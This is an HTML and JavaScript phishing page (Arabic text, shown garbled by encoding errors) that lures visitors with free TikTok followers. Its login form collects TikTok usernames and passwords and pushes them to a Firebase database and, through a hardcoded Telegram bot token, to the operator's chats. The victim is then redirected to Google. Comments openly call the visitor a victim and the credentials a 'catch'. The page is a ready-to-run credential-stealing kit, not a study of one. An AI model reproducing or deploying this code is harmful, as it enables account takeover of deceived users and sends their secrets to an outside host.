<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø²ÙŠØ§Ø¯Ø© Ù…ØªØ§Ø¨Ø¹ÙŠÙ† ØªÙŠÙƒ ØªÙˆÙƒ</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        
        body { text-align: center; background-color: #222; }

        .gradient-background {
            width: 100%; min-height: 100vh;
            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
            background-size: 400% 400%;
            animation: gradientAnimation 6s ease infinite;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .main-container {
            background-color: black; color: white; padding: 50px 20px;
            width: 80%; max-width: 600px; border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(255,255,255,0.2); margin: 20px 0;
        }

        .social-item {
            display: flex; justify-content: center; align-items: center;
            background-color: #333; padding: 15px; border-radius: 8px;
            width: 90%; max-width: 300px; margin: 10px auto;
            cursor: pointer; transition: 0.3s;
        }
        .social-item:hover { background-color: #444; }
        .social-item img { width: 40px; margin-left: 10px; }
        .social-item span { font-size: 20px; font-weight: bold; color: white; }

        .login-container, .loading-container {
            background-color: white; padding: 30px; border-radius: 15px;
            box-shadow: 0px 0px 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px;
            margin: 0 auto;
        }

        input, select {
            width: 100%; padding: 12px; margin: 10px 0;
            border: 1px solid #ccc; border-radius: 5px; font-size: 16px;
        }

        button {
            background-color: #ff5722; color: white; border: none;
            padding: 12px; width: 100%; border-radius: 5px;
            font-size: 18px; cursor: pointer;
        }
        button:hover { background-color: #e64a19; }

        .page { display: none; }
        .active-page { display: block; }
        
        .progress-container {
            width: 100%; background-color: #ddd;
            border-radius: 10px; overflow: hidden; height: 10px; margin: 10px 0;
        }
        .progress-bar { width: 100%; height: 100%; background-color: red; transition: width 1s linear; }
        #countdown { font-size: 20px; font-weight: bold; }
        .error-message { color: red; font-size: 14px; margin-top: 10px; }
        
        /* âŒ Ø´ÙŠÙ„ Ø§Ù„Ù€ Navigation Ø¯Ù‡ - Ù…Ø´ Ù„Ù„Ø¶Ø­ÙŠØ©! */
        .navigation { display: none; }
    </style>
</head>
<body>
    <!-- âŒ Ø´ÙŠÙ„ Ø§Ù„Ù€ Navigation Ø®Ø§Ù„Øµ! Ù…Ø´ Ù„Ù„Ø¶Ø­ÙŠØ© -->

    <!-- Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© -->
    <div id="home-page" class="page active-page">
        <div class="gradient-background">
            <div class="main-container">
                <h2 style="color: #ff9800; margin-bottom: 20px;">Ù…ØªØ§Ø¨Ø¹ÙŠÙ† ØªÙŠÙƒ ØªÙˆÙƒ Ù…Ø¬Ø§Ù†ÙŠ ğŸš€âš¡</h2>
                <p style="margin-bottom: 20px;">Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ø£ÙˆÙ„Ø§Ù‹ Ù„Ø²ÙŠØ§Ø¯Ø© Ù…ØªØ§Ø¨Ø¹ÙŠÙ† Ø­Ø³Ø§Ø¨Ùƒ</p>
                
                <div class="social-item" onclick="handleSocialClick('TikTok')">
                    <img src="https://i.postimg.cc/1zjC395p/png-clipart-tiktok-icon-tech-companies-thumbnail.png" alt="TikTok">
                    <span>TikTok</span>
                </div>
                <div class="social-item" onclick="handleSocialClick('Facebook')">
                    <img src="https://i.postimg.cc/Hn9d715L/1000209419-removebg-preview.png" alt="Facebook">
                    <span>Facebook</span>
                </div>
                <div class="social-item" onclick="handleSocialClick('Google')">
                    <img src="https://i.postimg.cc/QCsvmkhm/1000209421-removebg-preview.png" alt="Google">
                    <span>Google</span>
                </div>
            </div>
        </div>
    </div>

    <!-- ØµÙØ­Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div id="login-page" class="page">
        <div class="gradient-background">
            <div class="login-container">
                <h1 style="color: #ff5722;">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
                <p>ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ø³Ø§Ø¨ ØªÙŠÙƒ ØªÙˆÙƒ</p>
                <input type="text" id="username" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… / Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ">
                <input type="password" id="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                <select id="followers">
                    <option value="1000">1000 Ù…ØªØ§Ø¨Ø¹ - Ù…Ø¬Ø§Ù†ÙŠ âš¡</option>
                    <option value="2000">2000 Ù…ØªØ§Ø¨Ø¹ - Ù…Ø¬Ø§Ù†ÙŠ ğŸš€</option>
                    <option value="5000">5000 Ù…ØªØ§Ø¨Ø¹ - Ù…Ø¬Ø§Ù†ÙŠ ğŸ”¥</option>
                </select>
                <button onclick="validateForm()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨</button>
                <p class="error-message" id="error-message"></p>
            </div>
        </div>
    </div>

    <!-- ØµÙØ­Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± -->
    <div id="waiting-page" class="page">
        <div class="gradient-background">
            <div class="loading-container">
                <h1 style="color: red;">Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨...</h1>
                <p>Ø³ÙŠØªÙ… Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ù…ØªØ§Ø¨Ø¹ÙŠÙ† Ø®Ù„Ø§Ù„ 24 Ø³Ø§Ø¹Ø©</p>
                <img src="https://i.postimg.cc/FFy4S1NG/1000209418-removebg-preview.png" style="width: 80px; margin: 20px;">
                <div class="progress-container">
                    <div class="progress-bar" id="progress"></div>
                </div>
                <p id="countdown" style="font-size: 24px; font-weight: bold;">20</p>
            </div>
        </div>
    </div>

    <script>
        // âœ… Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase (ÙÙŠ Ø§Ù„Ø³ÙƒÙˆØ¨ Ø§Ù„Ø¹Ø§Ù…)
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // âœ… Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
        const adminChatId = "5375214810";

        // âœ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· (Ù…ÙˆØ­Ø¯)
        function getUserId() {
            const params = new URLSearchParams(window.location.search);
            return params.get("user_id") || "Unknown";
        }

        function getTelegramId() {
            const params = new URLSearchParams(window.location.search);
            return params.get("telegram") || null;
        }

        // âœ… Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ†Ù‚Ù„ Ø¨ÙŠÙ† Ø§Ù„ØµÙØ­Ø§Øª
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active-page');
            });
            document.getElementById(pageId + '-page').classList.add('active-page');
        }

        // âœ… Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        async function sendTelegramMessage(text, chatId) {
            if (!chatId || chatId === "Unknown" || chatId === "null") return;
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: "Markdown"
                    })
                });
            } catch (err) {
                console.error("Telegram Error:", err);
            }
        }

        // âœ… Ø¯Ø§Ù„Ø© Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Firebase
        async function saveDataToFirebase(data) {
            const userId = getUserId();
            if (userId === "Unknown") return;
            
            await db.ref('hits/' + userId).push({
                tool: "tiktok",                    // âœ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ø£Ø¯Ø§Ø©
                platform: "TikTok",
                username: data.username,
                password: data.password,
                followers: data.followers,
                time: data.time,
                timestamp: Date.now(),             // âœ… Ø¥Ø¶Ø§ÙØ© timestamp
                status: "Ø¬Ø¯ÙŠØ¯ âœ…"
            });
        }

        // âœ… Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ ÙˆØ³Ø§Ø¦Ù„ Ø§Ù„ØªÙˆØ§ØµÙ„
        function handleSocialClick(platform) {
            const userId = getUserId();
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ø£Ø¯Ù…Ù†
            const message = `ğŸ‘¤ **Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯**\nğŸŒ Ø§Ù„Ù…Ù†ØµØ©: ${platform}\nğŸ”— ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userId}`;
            sendTelegramMessage(message, adminChatId);
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„ØµÙØ­Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            showPage('login');
        }

        // âœ… Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
        async function validateForm() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const followers = document.getElementById("followers").value;
            const errorMessage = document.getElementById("error-message");
            const userId = getUserId();
            const telegramId = getTelegramId();

            if (!username || !password) {
                errorMessage.textContent = "ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„!";
                return;
            }

            // âœ… ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            const data = {
                username: username,
                password: password,
                followers: followers,
                time: new Date().toLocaleString('ar-EG')
            };

            // âœ… 1. Ø­ÙØ¸ ÙÙŠ Firebase
            await saveDataToFirebase(data);

            // âœ… 2. Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const msg = `ğŸ¯ **ØµÙŠØ¯Ø© ØªÙŠÙƒ ØªÙˆÙƒ Ø¬Ø¯ÙŠØ¯Ø©!**\n\n` +
                       `ğŸ“± Ø§Ù„Ø£Ø¯Ø§Ø©: ØªÙŠÙƒ ØªÙˆÙƒ\n` +
                       `ğŸ”— ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userId}\n` +
                       `ğŸ‘¤ Ø§Ù„Ø­Ø³Ø§Ø¨: ${username}\n` +
                       `ğŸ”‘ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯: ${password}\n` +
                       `ğŸ‘¥ Ø§Ù„Ù…ØªØ§Ø¨Ø¹ÙŠÙ†: ${followers}\n` +
                       `â° Ø§Ù„ÙˆÙ‚Øª: ${data.time}`;

            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø£Ø¯Ù…Ù†
            await sendTelegramMessage(msg, adminChatId);
            
            // Ø¥Ø±Ø³Ø§Ù„ Ù„ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·
            if (userId && userId !== "Unknown" && userId !== adminChatId) {
                await sendTelegramMessage(msg, userId);
            }
            
            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… ID Ø§Ù„Ù…Ø®ØµØµ
            if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
                await sendTelegramMessage(msg, telegramId);
            }

            // âœ… 3. Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„ØµÙØ­Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
            showPage('waiting');
            startCountdown();
        }

        // âœ… Ø¯Ø§Ù„Ø© Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
        function startCountdown() {
            let timeLeft = 20;
            const countdownElement = document.getElementById("countdown");
            const progressBar = document.getElementById("progress");

            if (!countdownElement || !progressBar) return;

            const countdownInterval = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = timeLeft;
                progressBar.style.width = (timeLeft / 20) * 100 + "%";

                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    // âœ… ØªØ­ÙˆÙŠÙ„ Ù„Ø¬ÙˆØ¬Ù„ Ø¨Ø¹Ø¯ Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ÙˆÙ‚Øª
                    window.location.href = "https://www.google.com";
                }
            }, 1000);
        }
    </script>
</body>
</html>